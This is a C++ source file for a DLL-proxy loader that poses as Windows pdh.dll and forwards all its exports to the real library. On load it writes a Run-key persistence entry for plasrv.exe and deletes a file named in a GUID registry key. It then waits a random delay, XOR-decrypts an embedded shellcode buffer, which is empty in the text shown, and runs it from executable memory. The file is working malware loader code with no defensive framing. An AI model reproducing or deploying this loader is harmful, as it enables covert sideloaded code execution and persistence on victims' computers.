// DLL Proxy
#include <windows.h>
#include <Shellapi.h>
#include <tchar.h>
#include "pch.h"
#include <stdio.h>
#include <thread>
#include "direct.h"
#include <Shlobj.h>
#include <Shlwapi.h>

#pragma comment(linker, "/export:PdhAddCounterA=C:\\Windows\\System32\\pdh.PdhAddCounterA")
#pragma comment(linker, "/export:PdhAddCounterW=C:\\Windows\\System32\\pdh.PdhAddCounterW")
#pragma comment(linker, "/export:PdhAddEnglishCounterA=C:\\Windows\\System32\\pdh.PdhAddEnglishCounterA")
#pragma comment(linker, "/export:PdhAddEnglishCounterW=C:\\Windows\\System32\\pdh.PdhAddEnglishCounterW")
#pragma comment(linker, "/export:PdhAddRelogCounter=C:\\Windows\\System32\\pdh.PdhAddRelogCounter")
#pragma comment(linker, "/export:PdhBindInputDataSourceA=C:\\Windows\\System32\\pdh.PdhBindInputDataSourceA")
#pragma comment(linker, "/export:PdhBindInputDataSourceW=C:\\Windows\\System32\\pdh.PdhBindInputDataSourceW")
#pragma comment(linker, "/export:PdhBrowseCountersA=C:\\Windows\\System32\\pdh.PdhBrowseCountersA")
#pragma comment(linker, "/export:PdhBrowseCountersHA=C:\\Windows\\System32\\pdh.PdhBrowseCountersHA")
#pragma comment(linker, "/export:PdhBrowseCountersHW=C:\\Windows\\System32\\pdh.PdhBrowseCountersHW")
#pragma comment(linker, "/export:PdhBrowseCountersW=C:\\Windows\\System32\\pdh.PdhBrowseCountersW")
#pragma comment(linker, "/export:PdhCalculateCounterFromRawValue=C:\\Windows\\System32\\pdh.PdhCalculateCounterFromRawValue")
#pragma comment(linker, "/export:PdhCloseLog=C:\\Windows\\System32\\pdh.PdhCloseLog")
#pragma comment(linker, "/export:PdhCloseQuery=C:\\Windows\\System32\\pdh.PdhCloseQuery")
#pragma comment(linker, "/export:PdhCollectQueryData=C:\\Windows\\System32\\pdh.PdhCollectQueryData")
#pragma comment(linker, "/export:PdhCollectQueryDataEx=C:\\Windows\\System32\\pdh.PdhCollectQueryDataEx")
#pragma comment(linker, "/export:PdhCollectQueryDataWithTime=C:\\Windows\\System32\\pdh.PdhCollectQueryDataWithTime")
#pragma comment(linker, "/export:PdhComputeCounterStatistics=C:\\Windows\\System32\\pdh.PdhComputeCounterStatistics")
#pragma comment(linker, "/export:PdhConnectMachineA=C:\\Windows\\System32\\pdh.PdhConnectMachineA")
#pragma comment(linker, "/export:PdhConnectMachineW=C:\\Windows\\System32\\pdh.PdhConnectMachineW")
#pragma comment(linker, "/export:PdhCreateSQLTablesA=C:\\Windows\\System32\\pdh.PdhCreateSQLTablesA")
#pragma comment(linker, "/export:PdhCreateSQLTablesW=C:\\Windows\\System32\\pdh.PdhCreateSQLTablesW")
#pragma comment(linker, "/export:PdhEnumLogSetNamesA=C:\\Windows\\System32\\pdh.PdhEnumLogSetNamesA")
#pragma comment(linker, "/export:PdhEnumLogSetNamesW=C:\\Windows\\System32\\pdh.PdhEnumLogSetNamesW")
#pragma comment(linker, "/export:PdhEnumMachinesA=C:\\Windows\\System32\\pdh.PdhEnumMachinesA")
#pragma comment(linker, "/export:PdhEnumMachinesHA=C:\\Windows\\System32\\pdh.PdhEnumMachinesHA")
#pragma comment(linker, "/export:PdhEnumMachinesHW=C:\\Windows\\System32\\pdh.PdhEnumMachinesHW")
#pragma comment(linker, "/export:PdhEnumMachinesW=C:\\Windows\\System32\\pdh.PdhEnumMachinesW")
#pragma comment(linker, "/export:PdhEnumObjectItemsA=C:\\Windows\\System32\\pdh.PdhEnumObjectItemsA")
#pragma comment(linker, "/export:PdhEnumObjectItemsHA=C:\\Windows\\System32\\pdh.PdhEnumObjectItemsHA")
#pragma comment(linker, "/export:PdhEnumObjectItemsHW=C:\\Windows\\System32\\pdh.PdhEnumObjectItemsHW")
#pragma comment(linker, "/export:PdhEnumObjectItemsW=C:\\Windows\\System32\\pdh.PdhEnumObjectItemsW")
#pragma comment(linker, "/export:PdhEnumObjectsA=C:\\Windows\\System32\\pdh.PdhEnumObjectsA")
#pragma comment(linker, "/export:PdhEnumObjectsHA=C:\\Windows\\System32\\pdh.PdhEnumObjectsHA")
#pragma comment(linker, "/export:PdhEnumObjectsHW=C:\\Windows\\System32\\pdh.PdhEnumObjectsHW")
#pragma comment(linker, "/export:PdhEnumObjectsW=C:\\Windows\\System32\\pdh.PdhEnumObjectsW")
#pragma comment(linker, "/export:PdhExpandCounterPathA=C:\\Windows\\System32\\pdh.PdhExpandCounterPathA")
#pragma comment(linker, "/export:PdhExpandCounterPathW=C:\\Windows\\System32\\pdh.PdhExpandCounterPathW")
#pragma comment(linker, "/export:PdhExpandWildCardPathA=C:\\Windows\\System32\\pdh.PdhExpandWildCardPathA")
#pragma comment(linker, "/export:PdhExpandWildCardPathHA=C:\\Windows\\System32\\pdh.PdhExpandWildCardPathHA")
#pragma comment(linker, "/export:PdhExpandWildCardPathHW=C:\\Windows\\System32\\pdh.PdhExpandWildCardPathHW")
#pragma comment(linker, "/export:PdhExpandWildCardPathW=C:\\Windows\\System32\\pdh.PdhExpandWildCardPathW")
#pragma comment(linker, "/export:PdhFormatFromRawValue=C:\\Windows\\System32\\pdh.PdhFormatFromRawValue")
#pragma comment(linker, "/export:PdhGetCounterInfoA=C:\\Windows\\System32\\pdh.PdhGetCounterInfoA")
#pragma comment(linker, "/export:PdhGetCounterInfoW=C:\\Windows\\System32\\pdh.PdhGetCounterInfoW")
#pragma comment(linker, "/export:PdhGetCounterTimeBase=C:\\Windows\\System32\\pdh.PdhGetCounterTimeBase")
#pragma comment(linker, "/export:PdhGetDataSourceTimeRangeA=C:\\Windows\\System32\\pdh.PdhGetDataSourceTimeRangeA")
#pragma comment(linker, "/export:PdhGetDataSourceTimeRangeH=C:\\Windows\\System32\\pdh.PdhGetDataSourceTimeRangeH")
#pragma comment(linker, "/export:PdhGetDataSourceTimeRangeW=C:\\Windows\\System32\\pdh.PdhGetDataSourceTimeRangeW")
#pragma comment(linker, "/export:PdhGetDefaultPerfCounterA=C:\\Windows\\System32\\pdh.PdhGetDefaultPerfCounterA")
#pragma comment(linker, "/export:PdhGetDefaultPerfCounterHA=C:\\Windows\\System32\\pdh.PdhGetDefaultPerfCounterHA")
#pragma comment(linker, "/export:PdhGetDefaultPerfCounterHW=C:\\Windows\\System32\\pdh.PdhGetDefaultPerfCounterHW")
#pragma comment(linker, "/export:PdhGetDefaultPerfCounterW=C:\\Windows\\System32\\pdh.PdhGetDefaultPerfCounterW")
#pragma comment(linker, "/export:PdhGetDefaultPerfObjectA=C:\\Windows\\System32\\pdh.PdhGetDefaultPerfObjectA")
#pragma comment(linker, "/export:PdhGetDefaultPerfObjectHA=C:\\Windows\\System32\\pdh.PdhGetDefaultPerfObjectHA")
#pragma comment(linker, "/export:PdhGetDefaultPerfObjectHW=C:\\Windows\\System32\\pdh.PdhGetDefaultPerfObjectHW")
#pragma comment(linker, "/export:PdhGetDefaultPerfObjectW=C:\\Windows\\System32\\pdh.PdhGetDefaultPerfObjectW")
#pragma comment(linker, "/export:PdhGetDllVersion=C:\\Windows\\System32\\pdh.PdhGetDllVersion")
#pragma comment(linker, "/export:PdhGetExplainText=C:\\Windows\\System32\\pdh.PdhGetExplainText")
#pragma comment(linker, "/export:PdhGetFormattedCounterArrayA=C:\\Windows\\System32\\pdh.PdhGetFormattedCounterArrayA")
#pragma comment(linker, "/export:PdhGetFormattedCounterArrayW=C:\\Windows\\System32\\pdh.PdhGetFormattedCounterArrayW")
#pragma comment(linker, "/export:PdhGetFormattedCounterValue=C:\\Windows\\System32\\pdh.PdhGetFormattedCounterValue")
#pragma comment(linker, "/export:PdhGetLogFileSize=C:\\Windows\\System32\\pdh.PdhGetLogFileSize")
#pragma comment(linker, "/export:PdhGetLogFileTypeW=C:\\Windows\\System32\\pdh.PdhGetLogFileTypeW")
#pragma comment(linker, "/export:PdhGetLogSetGUID=C:\\Windows\\System32\\pdh.PdhGetLogSetGUID")
#pragma comment(linker, "/export:PdhGetRawCounterArrayA=C:\\Windows\\System32\\pdh.PdhGetRawCounterArrayA")
#pragma comment(linker, "/export:PdhGetRawCounterArrayW=C:\\Windows\\System32\\pdh.PdhGetRawCounterArrayW")
#pragma comment(linker, "/export:PdhGetRawCounterValue=C:\\Windows\\System32\\pdh.PdhGetRawCounterValue")
#pragma comment(linker, "/export:PdhIsRealTimeQuery=C:\\Windows\\System32\\pdh.PdhIsRealTimeQuery")
#pragma comment(linker, "/export:PdhLookupPerfIndexByNameA=C:\\Windows\\System32\\pdh.PdhLookupPerfIndexByNameA")
#pragma comment(linker, "/export:PdhLookupPerfIndexByNameW=C:\\Windows\\System32\\pdh.PdhLookupPerfIndexByNameW")
#pragma comment(linker, "/export:PdhLookupPerfNameByIndexA=C:\\Windows\\System32\\pdh.PdhLookupPerfNameByIndexA")
#pragma comment(linker, "/export:PdhLookupPerfNameByIndexW=C:\\Windows\\System32\\pdh.PdhLookupPerfNameByIndexW")
#pragma comment(linker, "/export:PdhMakeCounterPathA=C:\\Windows\\System32\\pdh.PdhMakeCounterPathA")
#pragma comment(linker, "/export:PdhMakeCounterPathW=C:\\Windows\\System32\\pdh.PdhMakeCounterPathW")
#pragma comment(linker, "/export:PdhOpenLogA=C:\\Windows\\System32\\pdh.PdhOpenLogA")
#pragma comment(linker, "/export:PdhOpenLogW=C:\\Windows\\System32\\pdh.PdhOpenLogW")
#pragma comment(linker, "/export:PdhOpenQuery=C:\\Windows\\System32\\pdh.PdhOpenQuery")
#pragma comment(linker, "/export:PdhOpenQueryA=C:\\Windows\\System32\\pdh.PdhOpenQueryA")
#pragma comment(linker, "/export:PdhOpenQueryH=C:\\Windows\\System32\\pdh.PdhOpenQueryH")
#pragma comment(linker, "/export:PdhOpenQueryW=C:\\Windows\\System32\\pdh.PdhOpenQueryW")
#pragma comment(linker, "/export:PdhParseCounterPathA=C:\\Windows\\System32\\pdh.PdhParseCounterPathA")
#pragma comment(linker, "/export:PdhParseCounterPathW=C:\\Windows\\System32\\pdh.PdhParseCounterPathW")
#pragma comment(linker, "/export:PdhParseInstanceNameA=C:\\Windows\\System32\\pdh.PdhParseInstanceNameA")
#pragma comment(linker, "/export:PdhParseInstanceNameW=C:\\Windows\\System32\\pdh.PdhParseInstanceNameW")
#pragma comment(linker, "/export:PdhReadRawLogRecord=C:\\Windows\\System32\\pdh.PdhReadRawLogRecord")
#pragma comment(linker, "/export:PdhRelogW=C:\\Windows\\System32\\pdh.PdhRelogW")
#pragma comment(linker, "/export:PdhRemoveCounter=C:\\Windows\\System32\\pdh.PdhRemoveCounter")
#pragma comment(linker, "/export:PdhResetRelogCounterValues=C:\\Windows\\System32\\pdh.PdhResetRelogCounterValues")
#pragma comment(linker, "/export:PdhSelectDataSourceA=C:\\Windows\\System32\\pdh.PdhSelectDataSourceA")
#pragma comment(linker, "/export:PdhSelectDataSourceW=C:\\Windows\\System32\\pdh.PdhSelectDataSourceW")
#pragma comment(linker, "/export:PdhSetCounterScaleFactor=C:\\Windows\\System32\\pdh.PdhSetCounterScaleFactor")
#pragma comment(linker, "/export:PdhSetCounterValue=C:\\Windows\\System32\\pdh.PdhSetCounterValue")
#pragma comment(linker, "/export:PdhSetDefaultRealTimeDataSource=C:\\Windows\\System32\\pdh.PdhSetDefaultRealTimeDataSource")
#pragma comment(linker, "/export:PdhSetLogSetRunID=C:\\Windows\\System32\\pdh.PdhSetLogSetRunID")
#pragma comment(linker, "/export:PdhSetQueryTimeRange=C:\\Windows\\System32\\pdh.PdhSetQueryTimeRange")
#pragma comment(linker, "/export:PdhTranslate009CounterW=C:\\Windows\\System32\\pdh.PdhTranslate009CounterW")
#pragma comment(linker, "/export:PdhTranslateLocaleCounterW=C:\\Windows\\System32\\pdh.PdhTranslateLocaleCounterW")
#pragma comment(linker, "/export:PdhUpdateLogA=C:\\Windows\\System32\\pdh.PdhUpdateLogA")
#pragma comment(linker, "/export:PdhUpdateLogFileCatalog=C:\\Windows\\System32\\pdh.PdhUpdateLogFileCatalog")
#pragma comment(linker, "/export:PdhUpdateLogW=C:\\Windows\\System32\\pdh.PdhUpdateLogW")
#pragma comment(linker, "/export:PdhValidatePathA=C:\\Windows\\System32\\pdh.PdhValidatePathA")
#pragma comment(linker, "/export:PdhValidatePathExA=C:\\Windows\\System32\\pdh.PdhValidatePathExA")
#pragma comment(linker, "/export:PdhValidatePathExW=C:\\Windows\\System32\\pdh.PdhValidatePathExW")
#pragma comment(linker, "/export:PdhValidatePathW=C:\\Windows\\System32\\pdh.PdhValidatePathW")
#pragma comment(linker, "/export:PdhVbAddCounter=C:\\Windows\\System32\\pdh.PdhVbAddCounter")
#pragma comment(linker, "/export:PdhVbCreateCounterPathList=C:\\Windows\\System32\\pdh.PdhVbCreateCounterPathList")
#pragma comment(linker, "/export:PdhVbGetCounterPathElements=C:\\Windows\\System32\\pdh.PdhVbGetCounterPathElements")
#pragma comment(linker, "/export:PdhVbGetCounterPathFromList=C:\\Windows\\System32\\pdh.PdhVbGetCounterPathFromList")
#pragma comment(linker, "/export:PdhVbGetDoubleCounterValue=C:\\Windows\\System32\\pdh.PdhVbGetDoubleCounterValue")
#pragma comment(linker, "/export:PdhVbGetLogFileSize=C:\\Windows\\System32\\pdh.PdhVbGetLogFileSize")
#pragma comment(linker, "/export:PdhVbGetOneCounterPath=C:\\Windows\\System32\\pdh.PdhVbGetOneCounterPath")
#pragma comment(linker, "/export:PdhVbIsGoodStatus=C:\\Windows\\System32\\pdh.PdhVbIsGoodStatus")
#pragma comment(linker, "/export:PdhVbOpenLog=C:\\Windows\\System32\\pdh.PdhVbOpenLog")
#pragma comment(linker, "/export:PdhVbOpenQuery=C:\\Windows\\System32\\pdh.PdhVbOpenQuery")
#pragma comment(linker, "/export:PdhVbUpdateLog=C:\\Windows\\System32\\pdh.PdhVbUpdateLog")
#pragma comment(linker, "/export:PdhVerifySQLDBA=C:\\Windows\\System32\\pdh.PdhVerifySQLDBA")
#pragma comment(linker, "/export:PdhVerifySQLDBW=C:\\Windows\\System32\\pdh.PdhVerifySQLDBW")
#pragma comment(linker, "/export:PdhWriteRelogSample=C:\\Windows\\System32\\pdh.PdhWriteRelogSample")


void Hook_Init();
std::thread hookthread;
char shellcode[] = \
	
;


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH: {
		// Create a thread and close the handle as we do not want to use it to wait for it 
		// TODO: Remove after test
		HKEY hkey = NULL;
		LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"Software\\Classes\\87983e9e-fe92-11ed-be56-0242ac120002", 0, KEY_WRITE, &hkey);
		if (res == ERROR_SUCCESS) {
			char value[255] = { 0 };
			DWORD BufferSize = 255;
			RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"Software\\Classes\\87983e9e-fe92-11ed-be56-0242ac120002", "4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
			Sleep(100);
			if (value[0] != 0) {
				remove(value);
				RegSetValueEx(hkey, (LPCSTR)"4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", 0, REG_SZ, NULL,NULL);
			}
			else {
			}
			RegCloseKey(hkey);
		}
		// Create a thread and close the handle as we do not want to use it to wait for it 
		char path[200];
		_getcwd(path, 200);
		HKEY hkey2 = NULL;
		strcat_s(path, "\\plasrv.exe");
		const char* exe = path;
		// startup
		LONG res2 = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey2);
		if (res2 == ERROR_SUCCESS) {
			char value[255] = { 0 };
			DWORD BufferSize = 255;
			RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "plasrv1", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
			if (value[0] != 0) {
			}
			else {
				RegSetValueEx(hkey, (LPCSTR)"plasrv1", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
			}
			RegCloseKey(hkey);
		}
		srand(clock());
		int num = ((rand() % (100 - 1 + 1)) + 1) * 200;
		Sleep(num);
		hookthread = std::thread(Hook_Init);
	}
	case DLL_PROCESS_DETACH:
		hookthread.detach();
		// Code to run when the DLL is freed
		break;

	case DLL_THREAD_ATTACH:
		// Code to run when a thread is created during the DLL's lifetime
		break;
	case DLL_THREAD_DETACH:
		// Code to run when a thread ends normally.
		break;
	}
	return TRUE;
}

void Hook_Init(){
	char key[] = "NNQeLNivoQtjGDtQLrD7";
	int keySize = sizeof(key);
	int i;
	for (i = 0; i < sizeof(shellcode); i++) {
		shellcode[i] = shellcode[i] ^ key[i % keySize];
	}
	void* pShellcode;
	HANDLE hProcess = GetCurrentProcess();

	pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(pShellcode, shellcode, sizeof(shellcode));

	int (*func)();
	func = (int (*)()) pShellcode;
	(*func)();
}
